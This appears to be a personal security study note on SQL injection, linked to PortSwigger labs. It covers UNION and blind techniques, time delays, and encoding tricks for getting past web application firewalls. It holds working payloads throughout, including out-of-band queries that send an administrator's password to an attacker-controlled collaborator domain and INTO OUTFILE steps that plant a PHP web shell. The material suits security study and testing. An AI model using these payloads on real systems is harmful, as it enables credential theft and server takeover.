### General Notes

This is a vulnerability that happens when an attacker can control the queries being made to a database by the application.
- Sensitive data in the database can be viewed, edited, or even removed.
- Can be used to perform [[Denial of Service (DOS)]] attacks. 

There are 2 different types of SQL injections:
- `UNION` attacks.
- Blind attacks.

> Can use [[SQLMap]] for automation.

> [SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

---
### Finding SQL Injections

To detect SQL injections, test all the *entry points* of an application.
- User input.
- All types of [[HTTP]] parameters.
- [[HTTP#HTTP Headers]].
- [[Cookies]].

To test an entry point, try these techniques:
- Enter the single quote character `'`, and other injection characters, and look for weird responses.
- SQL syntax that results in the same output and different output if the expected input was given.
- Boolean conditions.
- Time delays.
- Payloads that trigger out-of-band network communication.
- [[Burp Suite]] Scanner.

Different injection characters to try and their [[Web Encoding#URL Encoding / Percent-Encoding]] as well:

| Payload | Encoding |
| ------- | -------- |
| `'`     | `%27`    |
| `"`     | `%22`    |
| `#`     | `%23`    |
| `;`     | `%3B`    |
| `)`     | `%29`    |

---
### `UNION` Based Injections

This SQL injection type is used to retrieve data from other tables, and combine it with the response of the actual query.
- This is done using the `UNION` keyword, which combines the outputs of multiple `SELECT` statements.

However, for a `UNION` injection to work, all the queries must:
- Return the same number of columns.
- The data types for each column must be the same across the queries.

> First find the number of columns, then start figuring out the data types of these columns. Only then, can `UNION` attack be conducted and the desired data can be extracted.

#### 1. Determining Number of Columns

There are 2 ways to determine the number of columns in a query;
- Using the `NULL` method.
- Using the `ORDER BY` method.

###### `NULL` Method

Keep adding `NULL` until there is an error. The number of `NULL`s right before the error is the number of columns.
- When the number of nulls matches the number of columns, an additional row of data will be returned in the result set, containing either the word `NULL` or an empty string.

```
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
```

* For oracle, need to add FROM for every SELECT. Use the built in `DUAL` table.
```
' UNION SELECT NULL FROM DUAL-- 
```

> The reason why `NULL` is used is because it is compatible with every data type, abiding by the laws of using `UNION` statements.

###### `ORDER BY` Method

Keep changing the `ORDER BY` index until an error is received. 
- The number right before the one that produces an error is the number of columns.

```
' ORDER BY 1--
' ORDER BY 2--
...
```

> Regardless of the method used, the goal is to detect a difference in the response by the server. Based on that, a decision can be made regarding the number of columns of the query.

#### 2. Checking the Data Type of a column

Having known the number of columns, we can replace the `NULL` with a string/number/data-type and check the output.
- If it succeeds, then we know the data type of that column.

```
' UNION SELECT 'a',NULL,NULL,NULL-- 
' UNION SELECT NULL,'a',NULL,NULL-- 
' UNION SELECT NULL,NULL,'a',NULL-- 
' UNION SELECT NULL,NULL,NULL,'a'--
```
- We keep trying a string in the different columns until one works.

#### 3. Performing Injection

To do an injection where the two `SELECT` queries output different columns:
- Add to the one with fewer columns more input data until it matches.
- Use concatenation `| |` to return multiple values at the same time within a single column.

Adding more dummy column values:
```SQL
SELECT * FROM table_1 UNION SELECT username, password, 1 FROM table_2;
```
- `table_1` has 3 columns, but `table_2` only has 2. So we add another fake column at the end to make it 3 and execute our `UNION` injection.

Using concatenation in Oracle:
```SQL
' UNION SELECT username || '~' || password FROM users--
```
- This returns the values of the `username` and `password` separated by `~` in a single column.
- We use concatenation when we cannot add end the current query, or start a new statement. Here, we are injecting within the same statement. Instead of simply concatenating columns, we can also concatenate an entire injection payload.

Sometimes, not all columns are produced as output visible by the user. Therefore, try different values at the different columns to see which ones are visible.

> The data we need is always produced at the end of the output in an extra row.

---
### Blind SQL Injections

Application doesn't return the results of the query, or details of any errors in its response.
- It is more difficult to exploit a blind vulnerability.

To detect a blind vulnerability:
1. Change logic of query to *trigger a detectable difference*. Such as Boolean logic or generate errors such as dividing by zero.
2. Trigger a *time delay conditionally* using Boolean logic. Infer the truth of the query using the time the application takes to respond. 
3. Trigger an *out-of-band network interaction*. For instance, placing the data retrieved in a [[Domain Name System (DNS)]] lookup for a domain that you control.

####  `AND` Test

Try injecting a payload and use the `AND` operator with a false statement and a true statement and notice the difference in response.
- This can be used to enumerate data from tables.

```SQL
x" AND 1=1--
x" AND 1=2--
x" AND password LIKE 'a%'--
x" AND length(password)>5--
```
- We can determine the truth of these queries by observing the response in false conditions and true conditions. Based on that, we can start enumerating data.

#### Conditional Responses using `TrackingId`

The behavior of the website can be used to exploit the blind vulnerability.
- We can submit both a recognized and unrecognized `TrackingID` and see how the website acts.
- We can then determine how the website acts based on true and false conditions, and use that to enumerate information.

Some applications use tracking cookies to gather data about usage and users.
- They are processed by a SQL query such as: 
```SQL
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

For example, using a simple `AND` test:
```SQL
…xyz' AND '1'='1 
…xyz' AND '1'='2
```
- The first expression is true, the second is false.
- If the website behaves differently for these 2, this allows us to determine the answer to any single injected condition, and extract data one piece at a time.
- Check [[#Blind Enumeration]] section.

#### Conditional Errors (Check the Portswigger [lab](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors))

Error-based SQL injection is using error messages to extract data from the database.
- We can induce a specific error response based on the result of a Boolean condition.
- We can trigger [[#Verbose SQL Error Messages]] that contain the data returned by the query.

We can use errors the same way we used conditional responses if the application does not behave differently.
- We can insert a payload that causes a database error only in the case that condition is true, and to do nothing otherwise.
- In the case of errors, some databases can return error messages, or the application can behave differently.
- Check [[#Blind Enumeration]].

We can use this idea to craft payloads to induce errors for true expressions:
```SQL
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END) = 'a --
xyz' || (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END) || 'a --
```
- Since `1=1`, then this condition evaluates to true. As a result, it performs `1/0`, which causes an error. 
- Use concatenation for easier expressions, do not need to check equality in the end. Note the single quote at the end.

In the case that the error produces a visible result in the application's response, we can use that to enumerate data from the database.
- We try to check if the username `administrator` exists. If it exists, the `CASE` statement will produce an error.
```SQL
xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') || ' --
```
- The `FROM` part of the query is evaluated first, checking the existence of the `administrator` username.
- If the username `administrator` exists, then the `SELECT` condition will execute.
- The `CASE` statement is always true, causing an error.
- If the username doesn't exist, then the `FROM` part fails, and the `CASE` will not run, and the website will return normally.
- `TO_CHAR` in oracle.

To add any more conditions, add `AND` in the FROM clause.
```SQL
xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND length(password)>5) || ' --
```

#### Verbose SQL Error Messages

Database misconfigurations can result in verbose error messages being returned by the application.
- This can sometimes show the entire query.

To return data in the error message, we can use the `CAST` function.
- This helps in converting from one data type to another.

We usually want to read string data, and converting it to an integer could lead to an error, which can contain information about the column name.
```SQL
' AND CAST((SELECT x FROM y) AS int) = 1-- 
```

#### Time Delays

As a final resort, we can trigger time delays based on the truth of the injected condition.
- If a SQL query execution is delayed, we can observe a delay in the [[HTTP]] response.
- This is only the case in synchronous, if the queries are executed asynchronously, this will not work. 

This is a query that uses delays to check for the truth of the condition.
- If there is an `administrator` user and the first letter of the password is larger than `m`, then a time delay will be placed before the query returns.
```SQL
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

Try also using `CASE` instead of `IF`, and place the delay logic there.
``` SQL
' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users --
```
- This checks for the presence of the `users` table.

The different delay syntax for the different DBMS:
* Microsoft: `WAITFOR DELAY '0:0:<delay>'
* PostgreSQL: `SELECT pg_sleep(delay)`
* MySQL: `SELECT SLEEP(10)`
* Oracle: `dbms_pipe.receive_message('a',10)

These are two ways to inject the payload.
```
'; SELECT pg_sleep(10)-- 
' || pg_sleep(10) --
```

#### Using OAST

In the case that queries are fetched asynchronously, using time delays will not work.
- We can use Out-of-bounds Application Security Testing.
- Trigger a network interaction to a system controlled by attacker using conditions as well.
- Using [[Burp Suite]] Collaborator as the controlled domain.

> Using the [[Domain Name System (DNS)]] [[Protocol]] is the most effective way, as DNS traffic is usually permitted.

The payloads for OAST for the different databases are in the [SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
- To add them, use this `' || <payload> -- ` or `' UNION <payload> --`.

An example of a payload that triggers a DNS lookup for the password:
```SQL
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.BURP_COLLAB_DOMAIN/a"')--

x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP_COLLAB_DOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

---
### Blind Enumeration 

We first need to understand how the website behaves given true and false conditions. We can then start to enumerate information based on the behavior of the website.

* Check for the presence of a table:
```SQL
HNgNNAq7tdrY9x17' AND (SELECT 'x' FROM users LIMIT 1)='x' --

HNgNNAq7tdrY9x17' AND (SELECT 'x' FROM users WHERE ROWNUM=1)='x' --
```
This returns an `x` for every row in the table. We limit to 1 to check for only 1 `x` returned. 
- If there is no `x` returned, then there is no table, or there are no rows in that table. 

* Check for the presence of an entry:
```SQL
HNgNNAq7tdrY9x17' AND (SELECT username FROM users WHERE username='administrator')='administrator' --
```

* Check for the length of a row entry:
```SQL
HNgNNAq7tdrY9x17' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password) > 1 )='administrator' --
```

* Check for the characters of a row entry: (`substr` for oracle)
```SQL
HNgNNAq7tdrY9x17' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='administrator')='a' --

xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```
- First 1 is the index, the second 1 is the length of the substring.

- Check for the existence of a username and password length using conditional errors.
```SQL
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

---
### Reading From Files

To be able to read data in a database system, we need to first have the `FILE` privilege granted for the user we are currently logged in as.

* To determine the user:
```SQL
SELECT USER()
SELECT CURRENT_USER()
SELECT user FROM mysql.user
```

* To determine the privileges for the user:
```SQL
SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee='our-user';
```

* We can also check if we have super privileges:
```SQL
SELECT super_priv FROM mysql.user WHERE user='our-user';
```
> It will return `Y` indicating yes, meaning we have superuser privileges.

If our user has the `FILE` privilege, we can now load a file's contents and dump it into the database:
```SQL
SELECT LOAD_FILE('path/to/file');
```
> This can be one of the columns while injecting a query.

---
### Writing To Files

To be able to write to files is more difficult than reading from files, there needs to be 3 conditions met.
##### Conditions To Meet

1. We need the user to have the `FILE` privilege.
2. We also need the [[mysql]] global variable `secure_file_priv` to be disabled or be configured weakly.
3. We need write access to te location we want to write to, preferrably the root directory of the web server.

This is a global variable that determines where we can read/write to files.
* If it is empty, we have complete access to the entire file system.
* If it is set to `NULL`, we have no access to the entire file system.
* If it is set to a specific directory, then this is the only place we can access.

To see its value: 
```SQL
SHOW variables LIKE 'secure_file_priv';
```

Using `UNION` injection, we can see its value from the `information_schema` database.
```SQL
UNION SELECT variable_name, variable_value FROM information_schema.global_variables WHERE variable_name='secure_file_priv';
```

##### Writing Procedure

To write to files, we can use the `INTO OUTFILE` syntax:
```SQL
SELECT * FROM table_1 INTO OUTFILE 'path/to/file';
SELECT 'This is text' INTO OUTFILE 'path/to/file';
```

The location we want to write to is usually the root directory of the web server. This is to ensure it is executed, and can be reached easily from a browser.
> To find the root directory:
* Use the `LOAD_FILE` command to read the server configuration. Its location is dependant on the system.
* Use fuzzing attack to write files to different web roots, and see which one works:
	* `/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt`
	* `/seclists/Discovery/Web-Content/default-web-root-directory-windows.txt`

The file we want to write is usually a [[File Upload#Web Shell]]. This is a famous one-liner:
```PHP
<?php echo system($_REQEUST["command"]); ?>
```

We can then write it using the above syntax:
```SQL
SELECT '<?php echo system($_GET["command"]); ?>' INTO OUTFILE '/root-directory/shell.php'
```

> Visiting the website with `/shell.php` at the end opens the reverse shell.
> Entering commands as a query parameter with name `command` exectues them.
 
```
/shell.php?command=<enter-here>
```

---
### Obfuscating Attacks

Obfuscating is using [[Web Encoding]] to perform attacks that could be blocked using web application [[Firewall]]s.
- Some websites take JSON or [[XML]] in their queries to ask the database.

> For XML use `hex-entities` encoding in [[Burp Suite]]'s hackvertor extension to bypass.

Can encode some letters of the query to bypass these defense mechanisms.
```SQL
SELECT * FROM information_schema.tables
&#x53;ELECT * FROM information_schema.tables
```
- This is encoding using an HTML entity of a hex.
- This will be decoded first server side, and then passed to the SQL interpreter that communicates with the database.

---
### Enumerating the Database

Get the database information and version.
```SQL
SELECT BANNER FROM v$version;    //oracle
SELECT version FROM v$instance   //oracle
SELECT @@version  //microsoft and MySQL
SELECT version() // PostgreSQL
```

###### Using `INFORMATION_SCHEMA` Database

This database has metadata information about the tables and databases present on the system. Can be used to get information about the system before attacking. 

> This doesn't work on Oracle systems. There is an equivalent below.

* To list the databases on the system.
```SQL
SELECT * FROM information_schema.schemata;
```

The elements in this table include:
* SCHEMA_NAME.

* To list all tables on the system.
```SQL
SELECT * FROM information_schema.tables ;
```

The elements in this database are: (instead of * you can use any of these)
* TABLE_NAME
* TABLE_CATALOG
* TABLE_SCHEMA
* TABLE_TYPE

* List all tables in a database.
```SQL
UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev';
```

* To get the information of a table.
```SQL
SELECT * FROM information_schema.columns WHERE table_name= '';
```

The elements in this database are same as above and: (instead of * you can use any of these)
* COLUMN_NAME
* DATA_TYPE

* To get the privilegs for users.
```SQL
SELECT grantee, privilege_type FROM information_schema.user_privileges;
```

* To get the global variables:
```SQL
SELECT variable_name, variable_value FROM information_schema.global_variables WHERE variable_name='what-we-want';
```

###### Using `INFORMATION_SCHEMA` Equivalent For Oracle

List all tables using `all_tables`
```
SELECT * FROM all_tables
```
* TABLE_NAME

List columns using `all_tab_columns`
```
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```
* COLUMN_NAME

---
### Useful Commands

Commands to identify first character of username.
```
select user(); // returns the current user
select substring(string,position,length); //substring from the position and takes length many chrs.
example: select substring(user(),1,1)='r'; // checks if first letter from user is r.
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

To concatenate results into one column:
* Oracle and PostgreSQL
```
SELECT username || ':' || password FROM users
```
* Microsoft
```
SELECT username + password FROM users
```
* MySQL (space)
```
SELECT username password FROM users
```

To make SQL case sensitive, use the `BINARY` keyword.

The `LIMIT` statement can be used to return not only a certain number of rows, but also a specific row. This can be done by placing an index:
```SQL
select username,pass from users where username='x' or 1=1 limit 2,1;
```
- This returns the third element only. (2nd index is the third element in the array).

---

### Preventing SQL Injections

* Using parameterized queries instead of string concatention within the query.
	* The string used in the query must be a constant and not contain variables.
* Input sanitization.
* Input validation.
* Adding user privileges, so that users have access to certain functions in certain tables.
* Adding a WAF, Web Application [[Firewall]]. This will monitor and check for weird queries, such as access to special tables like `information_schema`.

---
